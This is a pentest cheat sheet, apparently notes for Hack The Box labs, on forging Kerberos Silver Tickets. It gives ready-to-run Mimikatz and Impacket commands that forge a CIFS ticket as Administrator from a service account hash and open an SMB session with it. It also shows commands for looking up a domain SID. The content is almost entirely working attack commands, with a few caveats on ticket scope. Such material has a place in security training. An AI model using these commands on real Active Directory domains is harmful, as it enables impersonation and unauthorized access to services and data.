**Purpose:** Forge a Kerberos service ticket (TGS) for a particular service.

**When to use:** You have the secret of the service account and the information needed to construct a ticket.

### **Required information**

- Domain name
- Domain SID
- Service account NTLM hash or suitable encryption key
- Target hostname
- Service SPN
- Username to place in the ticket

### **Windows — Mimikatz**

Example: forging a CIFS ticket for `FILE01`.

```
kerberos::golden /domain:domain.local /sid:<DOMAIN_SID> /target:FILE01.domain.local /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /user:Administrator /ptt
```

### **Kali — Impacket**

```
impacket-ticketer \
-nthash <SERVICE_ACCOUNT_HASH> \
-domain-sid <DOMAIN_SID> \
-domain domain.local \
-spn cifs/FILE01.domain.local \
Administrator
```

Then:

```
export KRB5CCNAME=Administrator.ccache

impacket-smbclient -k -no-pass \
domain.local/Administrator@FILE01.domain.local
```

**Remember:**

- Silver Tickets are service-specific.
- A CIFS ticket is not automatically a ticket for HTTP, MSSQL or another service.
- Forging a ticket does not automatically grant local administrator or domain administrator privileges.
- The service must accept the forged ticket, and the identity must have the required permissions.

---

## **How to obtain the domain SID**

Useful for Silver and Golden Ticket construction.

### **Windows**

```
whoami /user
```

For the domain SID:

```
Get-ADDomain | Select-Object DomainSID
```

### **Kali — Impacket**

```
impacket-lookupsid domain.local/user:Password123!@<DC_IP>
```

Or use the domain SID shown in BloodHound/domain enumeration.

---

# HTB Cheatsheet

```
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid S-1-5-21-... -domain domain.htb -spn cifs/target.domain.htb administrator
```
